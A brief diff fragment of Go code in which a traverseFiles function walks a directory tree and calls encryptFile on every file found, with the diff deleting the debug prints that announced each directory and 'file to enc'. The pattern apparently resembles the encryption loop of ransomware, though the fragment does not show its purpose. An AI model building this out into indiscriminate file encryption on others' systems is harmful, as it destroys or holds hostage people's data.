@@ -105,11 +105,9 @@ func traverseFiles(path string) {
 		if file.IsDir() {
 			base := path + fileSep + file.Name()
 			dirs = append(dirs, base)
-			fmt.Println("dir path: ", base)
 		} else {
 			base := path + fileSep + file.Name()
 
-			fmt.Println("file to enc: ", base)
 			encryptFile(base)
 		}
 	}
